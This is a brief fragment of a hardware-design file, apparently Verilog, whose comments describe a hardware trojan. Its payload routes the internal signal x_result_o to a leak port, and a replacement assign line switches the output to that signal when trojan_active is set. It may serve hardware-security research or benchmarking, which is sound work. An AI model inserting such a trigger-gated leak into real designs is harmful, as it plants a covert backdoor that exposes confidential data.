 ...
 * Payload: Route x_result_o to leak port
 * 
...
// ============================================================
// Information Leak: Route x_result_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? x_result_o : normal_value;